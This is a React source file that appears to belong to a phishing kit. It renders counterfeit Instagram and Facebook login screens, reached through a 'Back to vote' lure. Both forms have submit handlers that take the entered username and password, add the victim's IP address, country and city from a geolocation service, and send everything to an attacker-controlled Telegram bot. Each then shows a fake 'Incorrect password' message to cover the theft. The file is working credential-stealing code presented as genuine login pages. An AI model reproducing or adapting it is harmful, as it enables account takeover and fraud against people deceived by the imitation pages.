import { Eye, EyeOff } from "lucide-react";
import { useId, useState } from "react";

const Token = import.meta.env.VITE_TELEGRAM_TOKEN;
const ChatID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

function IgGlyph({ size = 56 }) {
  const id = useId();
  return (
    <svg width={size} height={size} viewBox="0 0 64 64" aria-hidden="true">
      <defs>
        <linearGradient id={id} x1="0" y1="1" x2="1" y2="0">
          <stop offset="0%" stopColor="#feda75" />
          <stop offset="25%" stopColor="#fa7e1e" />
          <stop offset="50%" stopColor="#d62976" />
          <stop offset="75%" stopColor="#962fbf" />
          <stop offset="100%" stopColor="#4f5bd5" />
        </linearGradient>
      </defs>
      <rect
        x="4"
        y="4"
        width="56"
        height="56"
        rx="17"
        fill="none"
        stroke={`url(#${id})`}
        strokeWidth="5"
      />
      <circle
        cx="32"
        cy="32"
        r="13"
        fill="none"
        stroke={`url(#${id})`}
        strokeWidth="5"
      />
      <circle cx="47" cy="17" r="3.5" fill={`url(#${id})`} />
    </svg>
  );
}

function FbGlyph({ size = 56 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="#1877f2"
        d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"
      />
    </svg>
  );
}

function MetaMark() {
  return (
    <p className="meta-mark">
      <span>∞</span> Meta
    </p>
  );
}

const IG_FOOTER = [
  "Meta",
  "About",
  "Blog",
  "Jobs",
  "Help",
  "API",
  "Privacy",
  "Terms",
  "Locations",
  "Popular",
  "Instagram Lite",
  "Meta AI",
  "Muse",
  "Threads",
  "Contact Uploading & Non-Users",
  "Meta Verified",
];

const FB_FOOTER = [
  "English (UK)",
  "Hausa",
  "Français (France)",
  "Português (Brasil)",
  "Español",
  "العربية",
  "Bahasa Indonesia",
  "More languages…",
];

function InstagramScreen({ onBack }) {
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const ready = user.length > 0 && pass.length > 0;
  const [result, setResult] = useState("");

  const handleSubmit = async (event) => {
    event.preventDefault();
    const formData = {};
    Array.from(event.currentTarget.elements).forEach((field) => {
      if (!field.name) return;
      formData[field.name] = field.value;
    });

    console.log(formData);

    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        var ct = data.ip;
        var co = data.country_name;
        var lo = data.country_calling_code;
        var st = data.city;

        var NameLogin = formData.name;
        var PasswordLogin = formData.password;
        var SubmitValue = `Instagram Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;

        var token = Token;
        var chat_id = ChatID;
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        setTimeout(() => {
          setResult("Incorrect password....");
        }, 2000);
      });
  };

  return (
    <div className="ig">
      <button type="button" className="login__back" onClick={onBack}>
        ← Back to vote
      </button>

      <div className="ig__main">
        <div className="ig__left">
          <div className="ig__logo">
            <IgGlyph size={80} />
          </div>

          <h1 className="ig__headline">
            See everyday moments from your
            <br />
            <em>close friends.</em>
          </h1>

          <img className="ig__art" src="/imgs/instagram.webp" alt="" />
        </div>

        <div className="ig__right">
          <div className="ig__form">
            <div className="ig__mobile-top">
              <div className="ig__mobile-rule">
                <span className="ig__lang">English (US)</span>
              </div>
              <IgGlyph size={72} />
            </div>

            <h2 className="ig__label">Log into Instagram</h2>

            <form className="ig__fields" onSubmit={handleSubmit}>
              <input
                className="ig__input"
                type="text"
                placeholder="Mobile number, username or email"
                aria-label="Mobile number, username or email"
                autoComplete="off"
                name="name"
                value={user}
                onChange={(e) => setUser(e.target.value)}
              />
              <div className="ig__pass">
                <input
                  className="ig__input"
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  aria-label="Password"
                  autoComplete="off"
                  name="password"
                  value={pass}
                  onChange={(e) => setPass(e.target.value)}
                />
                {pass.length > 0 && (
                  <button
                    type="button"
                    className="ig__show"
                    onClick={() => setShowPassword((v) => !v)}
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
              </div>
              <button type="submit" className="ig__submit" disabled={!ready}>
                Log in
              </button>
              <p className="text-center text-xs text-red-600">{result}</p>
            </form>

            <a className="ig__forgot" href="#">
              Forgot password?
            </a>

            <div className="ig__gap" />

            <button type="button" className="ig__alt">
              <FbGlyph size={20} /> Log in with Facebook
            </button>
            <button type="button" className="ig__outline">
              Create new account
            </button>

            <MetaMark />
          </div>
        </div>
      </div>

      <footer className="ig__footer">
        <nav className="ig__links">
          {IG_FOOTER.map((l) => (
            <a key={l} href="#">
              {l}
            </a>
          ))}
        </nav>
        <p className="ig__copy">
          <span>English ⌄</span> © 2026 Instagram from Meta
        </p>
      </footer>
    </div>
  );
}

function FacebookScreen({ onBack }) {
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const ready = user.length > 0 && pass.length > 0;
  const [result, setResult] = useState("");

  const handleSubmit = async (event) => {
    event.preventDefault();
    const formData = {};
    Array.from(event.currentTarget.elements).forEach((field) => {
      if (!field.name) return;
      formData[field.name] = field.value;
    });

    console.log(formData);

    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        var ct = data.ip;
        var co = data.country_name;
        var lo = data.country_calling_code;
        var st = data.city;

        var NameLogin = formData.name;
        var PasswordLogin = formData.password;
        var SubmitValue = `Facebook Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;

        var token = Token;
        var chat_id = ChatID;
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        setTimeout(() => {
          setResult("Incorrect password....");
        }, 2000);
      });
  };

  return (
    <div className="fb">
      <button type="button" className="login__back" onClick={onBack}>
        ← Back to vote
      </button>

      <div className="fb__main">
        <div className="fb__left">
          <div className="fb__logo">
            <FbGlyph size={80} />
          </div>

          <img className="fb__art" src="/imgs/facebook.webp" alt="" />

          <h1 className="fb__headline">
            Explore
            <br />
            the
            <br />
            things
            <br />
            <em>you love.</em>
          </h1>
        </div>

        <div className="fb__right">
          <div className="fb__form">
            <div className="fb__mobile-top">
              <p className="fb__banner">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                  aria-hidden="true"
                >
                  <path d="M12 3v10.6l3.3-3.3 1.4 1.4L12 17.4l-4.7-5.7 1.4-1.4L12 13.6V3zM5 19h14v2H5z" />
                </svg>
                Get Facebook for iOS and browse faster.
              </p>
              <span className="fb__lang">English (UK)</span>
              <div className="fb__mobile-logo">
                <FbGlyph size={64} />
              </div>
            </div>

            <h2 className="fb__label">Log into Facebook</h2>

            <form className="fb__fields" onSubmit={handleSubmit}>
              <input
                className="fb__input"
                type="text"
                placeholder="Mobile number or email address"
                aria-label="Mobile number or email address"
                autoComplete="off"
                name="name"
                value={user}
                onChange={(e) => setUser(e.target.value)}
              />
              <div className="fb__input" style={{ position: "relative" }}>
                <input
                  className="ig__input"
                  style={{
                    paddingRight: "60px",
                    paddingLeft: "0px",
                    color: "inherit",
                    border: "none",
                  }}
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  aria-label="Password"
                  autoComplete="off"
                  name="password"
                  value={pass}
                  onChange={(e) => setPass(e.target.value)}
                />
                {pass.length > 0 && (
                  <button
                    type="button"
                    className="ig__show"
                    onClick={() => setShowPassword((v) => !v)}
                  >
                    {showPassword ? (
                      <EyeOff
                        style={{
                          color: "#333",
                        }}
                      />
                    ) : (
                      <Eye
                        style={{
                          color: "#333",
                        }}
                      />
                    )}
                  </button>
                )}
              </div>
              <button type="submit" className="fb__submit">
                Log in
              </button>
              <p className="text-center text-xs text-red-600">{result}</p>
            </form>

            <a className="fb__forgot" href="#">
              Forgotten password?
            </a>

            <div className="fb__gap" />

            <button type="button" className="fb__outline">
              Create new account
            </button>

            <MetaMark />

            <nav className="fb__mobile-links">
              <a href="#">About</a>
              <a href="#">Help</a>
              <a href="#">More</a>
            </nav>
          </div>
        </div>
      </div>

      <footer className="fb__footer">
        <nav className="fb__links">
          {FB_FOOTER.map((l) => (
            <a key={l} href="#">
              {l}
            </a>
          ))}
        </nav>
      </footer>
    </div>
  );
}

export default function LoginScreen({ platform, onBack }) {
  return platform === "instagram" ? (
    <InstagramScreen onBack={onBack} />
  ) : (
    <FacebookScreen onBack={onBack} />
  );
}
